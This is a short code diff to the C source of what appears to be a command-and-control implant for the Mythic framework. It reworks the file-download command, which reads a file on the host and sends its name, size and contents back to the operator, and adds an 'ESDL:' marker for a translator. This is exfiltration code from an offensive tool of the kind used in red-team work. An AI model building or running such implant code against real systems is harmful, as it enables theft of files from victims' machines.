@@ -31,12 +31,16 @@ VOID cmd_download(PINSTANCE inst, PPARSER args, PPACKAGE response) {
         return;
     }
 
-    // Send filename
-    package_add_string(inst, response, pathbuf);
-    // Send file size
+    // Response: "ESDL:" magic + int32 name_len + filename + int32 file_size
+    // + contents. The translator detects the magic and converts it to a
+    // single-chunk Mythic download (same pattern as the screenshot ESPNG:).
+    package_add_bytes(inst, response, (const BYTE*)"ESDL:", 5);
+    DWORD name_len = es_strlen(pathbuf);
+    package_add_int32(inst, response, name_len);
+    package_add_bytes(inst, response, (const BYTE*)pathbuf, name_len);
     package_add_int32(inst, response, file_size);
 
-    // Send file contents in chunks
+    // Send file contents
     BYTE chunk[8192];
     DWORD total_read = 0;
     while (total_read < file_size) {
